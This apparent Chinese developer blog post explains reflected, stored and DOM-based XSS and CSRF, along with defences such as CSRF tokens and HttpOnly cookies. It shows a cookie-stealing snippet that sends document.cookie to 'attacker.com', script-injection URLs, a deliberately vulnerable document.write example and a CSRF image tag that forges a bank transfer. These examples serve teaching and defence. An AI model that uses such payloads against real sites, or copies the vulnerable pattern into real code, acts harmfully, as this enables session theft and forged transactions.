---
title: xss和csrf
date: 2018-07-09 11:02:34
tags: 浏览器
---

# xss

> cross site scripting 的缩写，即跨站脚本攻击（为了不与 css 混淆）

- 主要分为三类，反射型、保存型和基于 dom 的 xss 攻击。这些漏洞的基本原理都一样，但是确定和利用漏洞方面又存在很大差异。

## 反射型

- 如果一个 web 程序可以动态的显示用户的错误信息，就有可能产生反射型漏洞
- 显著特征是应用程序没有进行任何过滤和净化措施

### 案例

- 如果一个网站的错误消息是这样显示的，www.xxx.com/error.php?message=sorry,an error occurred，然后服务器根据得到的 message，不进行过滤，复制到错误页面的模板<p>sorry,an error occurred</p>，返回给用户
- www.xxx.com/error.php?message=<script>alert 的写法(1)</script>，当用户打开错误页面的时候，就会出现<p><script>alert 的写法(1)</script></p>，弹出一个消息框

- 当然攻击者不会很傻的只 alert 一些消息，通常 xss 都会伴随会话劫持，截获通过验证的会话令牌。
- 截获用户的会话后，就可以访问该用户授权访问的所有数据和功能
- 比如攻击构造这样一个 url，message 信息如下

```javascript
let i = new Image();
i.src = "http://attacker.com?cookie=" + document.cookie;
```

- 由于浏览器的同源策略，直接向 attacker.com 发送 cookie 是无法获得 www.xxx.com 的 cookie，但是 img，iframe，scipr 标签可以跨域，这就是该漏洞被成为跨站脚本的原因。

## 保存型

- 脚本通常保存在后端数据库，不经过过滤就存储并且显示给用户
- 与反射性的流程不同的是，保存型需要向服务器提出至少两次请求，第一次将含有恶意代码的数据提交给服务器，服务器将数据保存，第二次是受害者访问含有恶意代码的数据，恶意代码执行
- 与反射型不同的是，保存型不需要一个专门设计的 url 来接受 cookie，只需要将含有恶意代码的页面发给用户，等待受害者访问即可。不过也可以用保存型的漏洞来获取用户 cookie 劫持。
- 如果社交论坛存在保存型的 xss 漏洞，黑客将自己的个人信息一栏修改成恶意的 js 代码，该代码实现两个功能，首先受害者先加自己为好友，然后修改受害者的个人信息为该恶意代码。黑客把个人信息保存并提交给服务器，只需要等受害者访问自己的个人信息页面，浏览器就会执行恶意脚本，然后可怕的“蠕虫”就开始了

## 基于 dom 的 xss 漏洞

- 前两种 xss 漏洞，都表现为一种特殊的模式，就是应用程序提取数据并返回给受害者。而基于 dom 的 xss 不具有这种特点，攻击者是借助于 javascript 来展开攻击的

## 案例

```javascript
let url = document.location;
let message = /message=(.+)$/.exec(url)[1];
document.write(message);
// js脚本中这样写，如果攻击者给受害者发送www.xxx.com/error.php?message=<script>alert(1)</script>，也可以展开xss漏洞攻击
```

- 所以写 js 的前端同学注意了，万一写出了有漏洞的代码，这锅得自己背。

## 解决方案

- 过滤一些关键字
- Cookie 防盗，在 Cookie 中防止放入用户名和密码，对 Cookie 信息进行 MD5 等算法进行多次散列存放，必要时还要对 ip 和 cookie 进行绑定，一旦检测异常，立马让用户重新登录；设置 http-only（不能用 js 脚本进行获取）

# csrf

> cross site request forgery 的缩写，即跨站脚本请求伪造

- 顾名思义是伪造请求冒充用户在站内的正常操作。
- 我们知道绝大多数网站是通过 cookie 等方式辨识用户身份（包括服务器端 session 的网站，因为 session id 大多也是保存在 cookie），再予以授权。
- 所以要伪造用户的正常操作，最好是通过 xss 或者链接欺骗等途径，让用户再本机（即拥有身份 cookie 的浏览器端）发起用户所不知道的请求（xss 是实现 csrf 的手段之一）

## 案例

- 一论坛网站的发帖是通过 get 请求访问，点击发帖之后 js 把发帖内容拼接成目标 url 并访问：http://example.com/bbs/create_post.php?title=标题&content=内容
- 那么我在论坛发一贴http://example.com/bbs/create_post.php?title=我是脑残&content=哈哈，只要有用户看到这个链接，那么他们的账户就会在不知情的情况下发布了这一个帖子。
- 如果一家银行用以执行转账操作的 url 为 http://www.examplebank.com/withdraw?account=AccoutName&amount=1000&for=PayeeName，那么黑客可以可以再另一个网站上放置如下代码：<img src="http://www.examplebank.com/withdraw?account=Alice&amount=1000&for=Badman">
- 如果有账户名为 alice 的用户访问了恶意站点，而她之前也刚访问过银行不久，登陆信息尚未过期，那么她就会损失 1000 元

## 解决方案

- 如何解决这个问题，过滤用户输入，不允许发布这种含有站内操作 url 的链接，这么做可能有点用，但是阻挡不了 csrf，因为攻击者可以通过 qq 发布这个链接，这样点击到这个链接的用户一样会中招。

- 所以对待 csrf，我们的视角需要和对待 xss 有所不同。csrf 不一定要有站内的输入，因为他不属于注入攻击，而是属于请求伪造。被伪造的请求可以是任何来源，而非一定是站内。

- 过滤请求的处理者
  - 检查 Referer 字段：可以检查是否来源于该域名（但是请求者是可以更改 http 请求头的，他可以给这个任何值）
  - 添加校验 token：也就是请求令牌，由于 csrf 的本质在于攻击者欺骗用户去访问自己设置的地址，所以如果要求再访问敏感数据请求的时候，要求用户浏览器提供不保存在 cookie 中，并且攻击者无法伪造的数据作为校验，那么攻击者就无法执行 csrf 攻击。这种数据通常是表单中的一个数据项。服务器将其生成并附加在表单中，其内容是一个伪乱数。当客户端通过表单提交请求的时候，这个伪乱数也一并提交上去校验。
- 改良站内 api 的设计，对于发布帖子这类创建资源的操作，应该只接受 post 请求，而 get 请求应该只浏览。最好是采用 RESTFUL 风格设计。

# 推荐阅读

- [总结 xss 与 csrf 两种跨站攻击](https://blog.tonyseek.com/post/introduce-to-xss-and-csrf/)
